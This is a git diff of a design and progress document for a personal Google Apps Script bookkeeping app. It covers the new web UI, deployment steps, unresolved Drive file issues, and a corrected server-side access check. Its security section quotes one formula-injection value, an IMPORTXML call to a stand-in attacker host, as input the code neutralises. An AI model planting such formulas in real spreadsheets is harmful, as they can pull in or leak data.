@@ -11,14 +11,69 @@ against real Sheets and real Drive — one entry per section, each walked throug
 every state and back, filenames and folders confirmed at each step, then
 `smokeCleanup()` removed every trace. Build order steps 1–6 are done.
 
-Locally, `npm run v2:test` runs the real source against stand-ins for Apps
-Script's services — 161 assertions covering all four sections, the revert path,
-the filename chain, the registry, both mail paths, send-once behaviour and the
-injection guards. Between the two, the only untested things left are the ones
-that need a UI.
+**The web UI is written and green locally, not yet deployed.** `v2/Web.js` and
+`v2/Index.html` are step 7: listing, the status control and the date dialog,
+served as one page. `npm run v2:test` covers them — 266 assertions now, up from
+161 — including the access check from both sides, the generated table columns,
+the dialog's Today-versus-Keep wording and a status change that reports a failed
+rename instead of a tick. What the harness cannot reach is the browser itself:
+the CSS, the tap-to-copy and the iOS date wheel are confirmed by hand.
 
-**Nothing is reachable from outside the editor.** There is no `doGet`/`doPost`,
-so no web app is deployed and the attack surface is zero until step 7.
+To deploy it: `npm run v2:push:force` — **`--force` is required**, because the
+manifest gained `userinfo.email` — then a new Web app deployment, execute as me,
+access restricted to myself, and re-authorise for the added scope.
+
+Expect an empty table on first load. `smokeCleanup()` removed every row and
+nothing can create one from the UI until step 8, so run `smokeTest()` from the
+editor for something to click on, and `smokeCleanup()` afterwards.
+
+### Step 7 verification — where it got to
+
+Deployed, authorised, and `smokeTest()` green against real Sheets and Drive.
+Confirmed by hand in the browser: sign-in, all four sections listing, the revert
+dialog reading `Keep …` rather than `Today`, a load failure showing as an error
+panel rather than "no data", and Cancel / Escape / tap-outside all writing
+nothing.
+
+**Two findings that turned out to be correct behaviour**, recorded because both
+read as bugs the first time:
+
+- A file failure does not roll back the status change (see Settled since).
+- Visiting the web app while signed out gets Google's sign-in page, not this
+  code's `Not authorized` — Google's own gate runs before `doGet`. The in-code
+  check only becomes load-bearing if the manifest is ever opened up, which is
+  why Siri gets its own project.
+
+**Two defects found by clicking, both fixed:** Escape closed the dialog without
+`preventDefault`, so the browser also left fullscreen; and a date could be set
+for a state the row had not reached (see Settled since).
+
+**Still outstanding — pick this up first:**
+
+- **An extra document in `Health/Inbox`.** Two receipt-ish files, one without a
+  `.txt` extension, after one `Justification URL` was deliberately broken during
+  testing. The likely reading is an orphan: nothing points at that file any more,
+  so transitions stopped renaming it while the receipt kept being renamed. Run
+  **`checkDocuments()`** from the editor — it reports every file reference and
+  whether it opens, plus any file in the tree that no row refers to. Unconfirmed
+  either way.
+- **Whether that is the whole story.** If `checkDocuments()` reports no orphans,
+  the extra file came from somewhere else — check `rows` for two Health entries,
+  i.e. `smokeTest()` having run twice.
+- **`smokeCleanup()` only trashes files a row still references.** A broken
+  reference leaves its file behind and reports it in `warnings`, so repair the
+  cell before cleaning up.
+- **Whether Drive links need an account hint.** Both document links appeared
+  broken in a browser with two Google accounts signed in. `uiFileUrl()` builds
+  `drive.google.com/file/d/<id>/view` with no `authuser`, so links resolve
+  against whichever account is default. Not yet distinguished from the orphan
+  above; if real it affects every document link in normal use.
+- **Not yet tested at all:** the phone (iOS date wheel, scrolling), tap-to-copy
+  on the IVA reference block, the status and category filters, and Income's
+  `Invoiced / Received / Logged` vocabulary rendering.
+
+**Not committed.** `v2/Web.js` and `v2/Index.html` are untracked; the manifest,
+`Config.js`, `Core.js`, `Setup.js`, the harness and this file are modified.
 
 | File | Contains |
 |---|---|
@@ -28,11 +83,13 @@ so no web app is deployed and the attack surface is zero until step 7.
 | `v2/Registry.js` | Self-populating supplier registry, fuzzy matching, lookup |
 | `v2/Setup.js` | `bootstrap()`, `setupScriptProperties()`, `checkScriptProperties()` |
 | `v2/Smoke.js` | `smokeTest()` / `smokeCleanup()` — the live smoke test, run from the editor |
+| `v2/Web.js` | `doGet`, the access check, `uiBootstrap` / `uiListEntries` / `uiSetStatus` / `uiSetEntryDate` |
+| `v2/Index.html` | The page. No templating — it fetches everything through `google.script.run` |
 | `v2/test/` | The harness. Local only — `.claspignore` keeps it out of the push |
 
-**Not written yet:** management module (edit / archive / hard delete / category
-lists), the web UI and custom form, Siri endpoint, OCR intake. There is no
-`doGet`/`doPost` yet, so nothing is reachable from outside the editor.
+**Not written yet:** the custom form (step 8), management module (edit / archive
+/ hard delete / category lists), Siri endpoint, OCR intake. There is no `doPost`,
+so the only outside surface is the signed-in UI.
 
 **The new account** — address in `.env` as `V2_CLASP_ACCOUNT`, since this repo is
 public. Its Apps Script project is
@@ -49,11 +106,10 @@ pass `--user v2`, a named credential holding the new account, while
 the root `clasp:*` scripts keep the default one for the old account. Log in once
 with `npm run v2:login`; check with `npm run v2:whoami`.
 
-**Next actual step: the web UI** — build order step 7. Listing and the status
-control, `doGet` serving one page, deployed restricted to the account. That is
-the first code with an outside surface, so it is also where `doGet` must check
-`Session.getEffectiveUser()` rather than trusting `access: MYSELF` (see
-Security).
+**Next actual step: the custom form** — build order step 8. Fields rendered from
+`SECTIONS`, file upload, registry autocomplete and prefill. Until it exists the
+UI can only show and move what is already there, and `createEntry` is reachable
+only from the editor.
 
 Re-running `bootstrap()` remains how you apply a config change: add a field to
 `SECTIONS`, push, re-run, and the column appears. That is how `Claim Emailed`
@@ -239,7 +295,8 @@ Every date behaves the same way — there is no auto/manual split:
 - Pre-filling rather than writing silently matters because `Invoiced`,
   `Received` and `Settled` are usually **backdated**. A silent "today" would be
   wrong most of the time and never noticed.
-- Any date can be **edited later** without changing state.
+- Any date the row **has reached** can be edited later without changing state.
+  A date for a *later* state is refused — see below.
 
 **The date dialog.** Selecting a state opens a small dialog:
 
@@ -462,11 +519,32 @@ undos did.
 
 ### Client
 
-One HTML page served by the Apps Script web app, using `google.script.run`
-instead of `fetch` — no API key, no CORS, caller identity known server-side.
+**Built** — `v2/Index.html`, one page served by the Apps Script web app, using
+`google.script.run` instead of `fetch`: no API key, no CORS, caller identity
+known server-side.
 
 One render function driven by section config. Explicit loading, empty and error
 states, so a failure stops looking identical to "no data".
+
+Two things the page deliberately does not do:
+
+- **No templating.** It fetches everything through `google.script.run`, so there
+  is one path by which data reaches the client rather than two, and no sheet
+  value is ever interpolated into markup. `uiBootstrap()` is one round trip for
+  the four sections' shapes; `uiListEntries()` is one range read per section.
+- **No optimistic rendering.** Every action returns the row as the sheet now
+  holds it, re-read rather than assumed, and the page re-renders from that. This
+  is what makes "never report success for work that failed" visible: a status
+  change that moved the status but could not rename the file shows the new state
+  *and* says which document failed.
+
+**The dialog's wording is decided server-side.** Each row comes back with one
+option per state carrying that state's date column and the date the row already
+holds for it, so the primary button can read `Keep 5 Mar` instead of `Today`
+without a second round trip — and so the harness can test it, which it could not
+if the rule lived in the page. That wording is not cosmetic: `setStatus` only
+fills a blank date, so a button saying "Today" on the revert path would be
+claiming something the server is about to refuse to do.
 
 ### Supplier registry
 
@@ -646,18 +724,46 @@ not automatic — means the same mishearing resolves next time.
 
 | Entry point | Deployment | Auth | Can do |
 |---|---|---|---|
-| Web UI | Execute as me, **restricted to my account** | Google sign-in | Everything |
-| Siri | Execute as me, anyone with key | Key held on device only | `createEntry` only |
+| Web UI | This project. Execute as me, **restricted to my account** | Google sign-in, **re-checked in the code** on every call | Everything |
+| Siri | **A separate project** (see below). Execute as me, anyone with key | Key held on device only | `createEntry` only |
 
 No secret ever reaches a public file. The Siri key lives in the Shortcut and in
 Script Properties, nowhere else.
 
 **Scopes are pinned in `appsscript.json`** rather than inferred, so widening
 them is a visible diff instead of a side effect of adding a line of code:
-`spreadsheets`, `drive`, `script.send_mail`. Mail goes through **`MailApp`, not
-`GmailApp`** — both send as you, but `GmailApp` asks for `https://mail.google.com/`,
-full read and write of the whole mailbox, which this code has no business
-holding. Adding `doGet` will need `userinfo.email` for `Session.getEffectiveUser()`.
+`spreadsheets`, `drive`, `script.send_mail`, and `userinfo.email` since step 7.
+Mail goes through **`MailApp`, not `GmailApp`** — both send as you, but
+`GmailApp` asks for `https://mail.google.com/`, full read and write of the whole
+mailbox, which this code has no business holding.
+
+### The UI's own access check — corrected while building it
+
+This plan said `doGet` should check `Session.getEffectiveUser()`. **That would
+have been a check that always passes.** Under "execute as me" the effective user
+*is* the deploying account, whoever is visiting — so comparing it to anything is
+comparing me to me. The caller is `Session.getActiveUser()`, and that is what
+`uiAccessCheck()` in `Web.js` reads:
+
+- The allowed set is `UI_ALLOWED_EMAILS` when set, otherwise just the effective
+  user — so leaving it unset means "only me" rather than "anyone".
+- A blank active user is denied, and so is a failure to read one at all: a
+  missing scope or a revoked authorisation produces a denial rather than an
+  exception something might carry on from.
+- **Every function the page can call checks for itself**, not just `doGet`.
+  `google.script.run` reaches any global in the project — including
+  `bootstrap()` and `smokeCleanup()` — so the deployment setting cannot be the
+  only gate.
+
+**And the "or" in the Siri note below resolves to its second branch.** Under
+`ANYONE_ANONYMOUS` Google signs nobody in, so `getActiveUser()` is blank for
+*everyone including me*; a `doGet` that checks the caller then locks me out too.
+That is the right direction to fail, but it means opening the manifest for Siri
+cannot be rescued by a check inside `doGet`. **Siri gets its own Apps Script
+project.** Decided, not a preference.
+
+Two constraints follow for step 11: that separate project, and `doPost` still
+whitelisting its fields (below).
 
 **Every value written to a sheet passes through `safeCellValue`.** A counterparty
 of `=IMPORTXML("http://evil.test","//x")` is stored as text, not executed. This
@@ -671,11 +777,12 @@ Two constraints to respect when the Siri endpoint is built:
   passing a URL for a file of yours would have it renamed and moved into
   HelpfulForms. Siri sends the core fields only; whitelist them explicitly
   rather than passing its payload to `createEntry` unfiltered.
-- **One manifest, two deployments.** `webapp.access` is per project, not per
-  deployment, so opening it to `ANYONE_ANONYMOUS` for Siri also opens the UI
-  deployment. When that happens, `doGet` must check
-  `Session.getEffectiveUser().getEmail()` itself rather than relying on
-  `access: MYSELF` — or Siri gets its own separate Apps Script project.
+- **One manifest, two deployments — so Siri gets its own project.**
+  `webapp.access` is per project, not per deployment, so opening it to
+  `ANYONE_ANONYMOUS` for Siri also opens the UI deployment, and no check inside
+  `doGet` can compensate (see above: anonymous access blanks the caller's
+  identity for everyone). A second Apps Script project is the only version of
+  this that stays safe.
 
 ---
 
@@ -709,13 +816,22 @@ Each step should leave the system working.
    at each step. `smokeCleanup()` then removes exactly the rows it made, their
    files, and the registry entry it taught. Confirm this before building
    anything on top.
-7. **Web UI**: listing and the status control. Deploy restricted to your
-   account. Confirm sign-in, listing, status changes, dates.
+7. **Web UI**: listing and the status control — **written, deploy pending**.
+   `v2/Web.js` and `v2/Index.html`. Push with `npm run v2:push:force`, since the
+   manifest gained `userinfo.email`; a plain push declines silently and reports
+   `Skipping push.` Then a new Web app deployment, execute as me, access
+   restricted to myself, and re-authorise for the added scope. Confirm sign-in,
+   listing, status changes and dates in a browser — the harness covers the server
+   side, but not the CSS, the tap-to-copy or the iOS date wheel. Nothing can
+   create a row from the UI until step 8, so use `smokeTest()` for rows to click
+   on and `smokeCleanup()` afterwards.
 8. **Custom form** as a view in the same app: fields rendered from `SECTIONS`,
    file upload, registry autocomplete and prefill.
 9. **Management module**: edit, delete-to-archive, hard delete, category lists.
 10. **Cutover** — see below.
-11. **Siri Shortcut** + second narrow deployment.
+11. **Siri Shortcut** in its own Apps Script project — not a second deployment
+    of this one. See Security: anonymous access is per project, and it blanks the
+    caller's identity for everyone.
 12. **OCR intake.**
 
 Steps 1–10 restore what you have today, cleanly. 11 and 12 are new capability
@@ -766,6 +882,24 @@ stop.
 
 ### Settled since
 
+- **A date cannot be set for a state the row has not reached.** Found by
+  clicking, not by reading: a `Claimed Date` could be typed onto a row still in
+  `To Do`, and the next transition would clear it, because `setStatus` wipes the
+  dates of every state after the target. Accepting a value that quietly
+  disappears is worse than refusing it, so `setEntryDate` now refuses, naming the
+  state and telling you to select it instead. Two exceptions: clearing is always
+  allowed, and a row whose `Status` is off-vocabulary stays editable, since the
+  UI is the only place a hand-edited sheet gets noticed and it has to remain
+  repairable from there. The page follows the same rule — an unreached state's
+  date chip is not a control — but the rule lives on the server, because the
+  client is never trusted.
+- **A file failure does not roll back the status change.** Confirmed live and
+  worth stating plainly, since it looks like a bug the first time: the status
+  moves, the date is written, and the failed rename is reported in the same
+  breath. Rolling back would leave the row misdescribing where it is, and the
+  rename is recoverable — the suffix chain is rebuilt from the row's dates on
+  every transition, so fixing the URL and re-selecting the state repairs the
+  filename.
 - **Claim emails fire once, when the document is there, and at no other time.**
   Work and IVA both mail on creation, gated on the entry being complete and its
   document actually opening. A `Claim Emailed` column — present only in sections
